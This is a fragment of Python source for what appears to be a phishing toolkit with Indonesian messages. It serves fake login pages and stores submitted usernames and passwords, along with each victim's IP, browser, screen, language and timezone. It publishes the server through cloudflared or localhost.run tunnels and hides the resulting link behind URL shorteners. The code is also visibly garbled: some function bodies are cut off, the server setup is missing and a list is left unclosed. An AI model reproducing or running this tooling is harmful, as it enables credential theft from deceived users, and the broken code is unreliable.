def human_time(seconds):
    try: seconds = int(seconds)
    except Exception: return "0s"
    if seconds < 60: return f"{seconds}s"
    if seconds < 3600: return f"{seconds // 60}m {seconds % 60}s"
    if seconds < 86400: return f"{seconds // 3600}h {(seconds % 3600) // 60}m"
    return f"{seconds // 86400}d {(seconds % 86400) // 3600}h"

def _pip_install(name, timeout=120):
    try:
        subprocess.run([sys.executable,"-m","pip","install",name,"--quiet","--disable-pip-version-check","--no-warn-script-location","--no-cache-dir"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, check=False, timeout=timeout)
    except Exception: return False

def _pkg_has(binary):
    try: return shutil.which(binary) is not None
    except Exception: return False

def _pkg_install(name, binary=None, timeout=30):
    binary = binary or name
    if _pkg_has(binary): return True
    for cmd in (["pkg","install","-y",name],["apt","install","-y",name]):
        if not shutil.which(cmd[0]): continue
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
            try: proc.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                proc.kill()
                try: proc.communicate(timeout=2)
                except Exception: pass
                continue
            if _pkg_has(binary): return True
        except Exception: continue
    return False

def stream_music():
    global music_process
    if not shutil.which("yt-dlp"): return False
    player = None
    for c in ("mpv", "ffplay"):
        if shutil.which(c): player = c; break
    if player is None: return False
    ytdlp_cmd = ["yt-dlp","-f","bestaudio/best","-o","-","--no-playlist","--quiet","--no-warnings",f"ytsearch1:{SONG_QUERY}"]
    player_cmd = (["mpv","-","--no-video","--really-quiet","--audio-display=no","--cache=yes","--cache-secs=10"] if player == "mpv" else ["ffplay","-nodisp","-autoexit","-loglevel","quiet","-i","-"])
    try:
        producer = subprocess.Popen(ytdlp_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        player_proc = subprocess.Popen(player_cmd, stdin=producer.stdout, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if producer.stdout: producer.stdout.close()
        music_process = player_proc
        return True
    except Exception: return False

def start_music_async():
    t = threading.Thread(target=stream_music, daemon=True); t.start(); return t

def build_info_row(pairs):
    grid = Table.grid(expand=True, padding=(0,1))
    for _ in range(len(pairs)):
        grid.add_column(ratio=1)
    row_cells = []
    for label, value, style in pairs:
        cell = Text()
        cell.append(str(label) + "\n", style="dim white")
        cell.append(str(value), style=style)
        row_cells.append(Panel(cell, border_style="bright_black", box=box.ROUNDED, padding=(0,1)))
    grid.add_row(*row_cells)
    return grid

    def _send(self, code, body=b"", ctype="text/html; charset=utf-8"):
        try:
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.end_headers()
            if body: self.wfile.write(body)
        except Exception: pass

    def _redirect(self, url):
        try:
            self.send_response(302)
            self.send_header("Location", url)
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
        except Exception: pass

    def do_GET(self):
        path, _ = parse_request_path(self.path)
        if path == "/__ping":
            self._send(200, b"ok", "text/plain")
            return
        if path == "/sw.js":
            self._send(200, PWA_SW.encode(), "application/javascript")
            return
        tpl = PHISH_TEMPLATES.get(phish_state.get("active_template", "1"), PHISH_TEMPLATES["1"])
        if path in ("/login", "/", "/signin", "/accounts/login/", "/auth"):
            html = tpl["html"].replace("__BASE__", phish_base_style())
            self._send(200, html.encode())
            return
        self._redirect(tpl["redirect"])

    def do_POST(self):
        path, _ = parse_request_path(self.path)
        length = int(self.headers.get("Content-Length") or 0)
        raw = b""
        try:
            if length > 0: raw = self.rfile.read(min(length, 65536))
        except Exception: raw = b""
        if path == "/__p":
            data = _safe_json_loads(raw.decode(errors="ignore"), {}) or {}
            phish_state["creds"].append({
                "ts": time.time(),
                "ip": _client_ip(self),
                "user": str(data.get("u", ""))[:200],
                "pass": str(data.get("p", ""))[:200],
                "ua": str(data.get("ua", ""))[:300],
                "screen": str(data.get("screen", ""))[:40],
                "lang": str(data.get("lang", ""))[:40],
                "tz": str(data.get("tz", ""))[:60],
            })
            self._send(200, b"{}", "application/json")
            return
        self._send(204, b"", "text/plain")

def start_phish_server(port=None):

    for attempt in range(3):
        try:

            server.daemon_threads = True
            t = threading.Thread(target=server.serve_forever, daemon=True); t.start()
            phish_state.update({"server":server,"server_thread":t,"running":True,"port":port,"start_ts":time.time()})
            return True
        except Exception: time.sleep(0.5)
    console.print("[bold red]gagal start phishing server[/]"); return False

def _ensure_cloudflared():

    if found: return found

    local_bin = os.path.join(local_dir, "cloudflared")
    if os.path.exists(local_bin) and os.access(local_bin, os.X_OK):
        try:
            if os.path.getsize(local_bin) > 1000000: return local_bin
        except Exception: pass
    try: os.makedirs(local_dir, exist_ok=True)
    except Exception: return None
    machine = (platform.machine() or "").lower()
    if machine in ("aarch64", "arm64"): arch = "arm64"
    elif machine in ("armv7l", "armv7", "arm"): arch = "arm"
    elif machine in ("x86_64", "amd64"): arch = "amd64"
    elif machine in ("i386", "i686", "x86"): arch = "386"
    else: return None
    urls = [
        f"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-{arch}",
        f"https://github.com/cloudflare/cloudflared/releases/download/2024.10.0/cloudflared-linux-{arch}",
        f"https://github.com/cloudflare/cloudflared/releases/download/2024.8.3/cloudflared-linux-{arch}",
    ]
    for url in urls:
        try:
            if shutil.which("curl"):
                subprocess.run(["curl","-fsSL","-o",local_bin,url], timeout=150, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif requests_mod:
                r = requests_mod.get(url, timeout=150, stream=True)
                with open(local_bin, "wb") as f:
                    for chunk in r.iter_content(65536):
                        if chunk: f.write(chunk)
            else:
                continue
            if os.path.exists(local_bin) and os.path.getsize(local_bin) > 1000000:
                os.chmod(local_bin, 0o755)
                return local_bin
        except Exception:
            continue
    return None

def _scan_proc_for_url(proc, pattern, timeout=35):
    q = queue.Queue()
    def rd(stream):
        try:
            for line in iter(stream.readline, b""):
                try: q.put(line.decode(errors="ignore"))
                except Exception: q.put(str(line))
        except Exception:
            pass
    for stream in (proc.stdout, proc.stderr):
        if stream:
            threading.Thread(target=rd, args=(stream,), daemon=True).start()
    deadline = time.time() + timeout
    while time.time() < deadline:
        try: line = q.get(timeout=0.5)
        except queue.Empty:
            if proc.poll() is not None: return None
            continue
        m = re.search(pattern, line)
        if m:
            found_url = m.group(0)
            if "admin.localhost.run" in found_url:
                continue
            return found_url
    return None

def _verify_tunnel(url, timeout=8, attempts=3):
    if not requests_mod: return True
    if "admin.localhost.run" in url: return False
    base = url.rstrip("/")
    for i in range(attempts):
        try:
            r = requests_mod.get(base + "/__ping", timeout=timeout, verify=False, allow_redirects=True)
            if r.status_code == 200 and r.text.strip() == "ok":
                return True
        except Exception:
            pass
        if i < attempts - 1:
            time.sleep(1.5)
    return False

def _spawn_logged(cmd, pattern, timeout=35):
    proc = None
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
    except Exception:
        return None, None
    url = _scan_proc_for_url(proc, pattern, timeout=timeout)
    if not url:
        try: proc.terminate()
        except Exception: pass
        try: proc.wait(timeout=3)
        except Exception:
            try: proc.kill()
            except Exception: pass
        return None, None
    return url, proc

def _tunnel_cloudflared(port):
    binary = _ensure_cloudflared()
    if not binary: return None, None
    return _spawn_logged(
        [binary, "tunnel", "--no-autoupdate", "--protocol", "http2",
         "--edge-ip-version", "4", "--url", f"http://127.0.0.1:{port}"],
        TUNNEL_URL_PATTERNS["cloudflared"], timeout=50
    )

def _tunnel_localhostrun(port):
    if not shutil.which("ssh"): return None, None
    cmd = ["ssh","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null",
           "-o","ServerAliveInterval=25","-o","ServerAliveCountMax=3",
           "-o","ExitOnForwardFailure=yes","-o","ConnectTimeout=15",
           "-R",f"80:127.0.0.1:{port}","nokey@localhost.run"]
    return _spawn_logged(cmd, TUNNEL_URL_PATTERNS["localhostrun"], timeout=40)

TUNNEL_PROVIDERS = [
    ("cloudflared", _tunnel_cloudflared),
    ("localhost.run", _tunnel_localhostrun),
]

def _race_provider(name, fn, port, result_q):
    try:
        url, proc = fn(port)
        if url:
            result_q.put((name, url, proc))
    except Exception:
        pass

def _cleanup_losers(collected, winner_proc):
    for name, url, proc in collected:
        if proc is None: continue
        if winner_proc is not None and proc is winner_proc:
            spawn_tunnel(proc)
            continue
        try: proc.terminate()
        except Exception: pass
        try: proc.wait(timeout=3)
        except Exception:
            try: proc.kill()
            except Exception: pass

def get_tunnel_required(port, max_rounds=6):
    _ensure_cloudflared()
    for round_idx in range(max_rounds):
        result_q = queue.Queue()
        for name, fn in TUNNEL_PROVIDERS:
            threading.Thread(target=_race_provider, args=(name, fn, port, result_q), daemon=True).start()
        collected = []
        winner = None
        deadline = time.time() + 70
        while time.time() < deadline:
            try:
                item = result_q.get(timeout=1.5)
            except queue.Empty:
                if len(collected) >= len(TUNNEL_PROVIDERS):
                    break
                continue
            collected.append(item)
            name, url, proc = item
            if _verify_tunnel(url, timeout=8, attempts=3):
                winner = item
                break
        if winner:
            _cleanup_losers(collected, winner[2])
            return winner[1], winner[0]
        _cleanup_losers(collected, None)
        time.sleep(1.5)
    return None, None

MASK_CACHE = {}
MASK_SHORTENERS = [
    ("is.gd", "https://is.gd/create.php?format=simple&url={}"),
    ("v.gd", "https://v.gd/create.php?format=simple&url={}"),
    ("tinyurl", "https://tinyurl.com/api-create.php?url={}"),

def _short_url_ok(url):
    if not url or not isinstance(url, str): return False
    url = url.strip()
    if not url.startswith("http"): return False
    if len(url) > 100: return False
    low = url.lower()
    for bad in ("error","invalid","blocked","denied","not found","exception","try again"):
        if bad in low: return False
    return True

def _shorten_via(name, endpoint, long_url):
    if not requests_mod: return None
    try:
        encoded = quote(long_url, safe="")
        url = endpoint.format(encoded)
        r = requests_mod.get(url, timeout=10, verify=False, headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code != 200: return None
        text = (r.text or "").strip()
        if _short_url_ok(text):
            return text
        m = re.search(r"https?://[A-Za-z0-9./-]+", text)
        if m and _short_url_ok(m.group(0)):
            return m.group(0)
    except Exception:
        pass
    return None

def _verify_short_target(short_url, expected_base):
    if not requests_mod or not short_url or not expected_base: return True
    try:
        r = requests_mod.get(short_url, timeout=8, verify=False, allow_redirects=False, headers={"User-Agent": "Mozilla/5.0"})
        loc = r.headers.get("Location") or ""
        if not loc: return True
        exp_host = urlparse(expected_base).netloc.lower()
        loc_host = urlparse(loc).netloc.lower()
        if exp_host and loc_host and exp_host == loc_host:
            return True
        if exp_host and exp_host in loc.lower():
            return True
    except Exception:
        pass
    return True

def mask_link(url):
    if not requests_mod or not url: return url
    if url in MASK_CACHE: return MASK_CACHE[url]
    for name, endpoint in MASK_SHORTENERS:
        short = _shorten_via(name, endpoint, url)
        if short:
            if _verify_short_target(short, url):
                MASK_CACHE[url] = short
                return short
    MASK_CACHE[url] = url
    return url
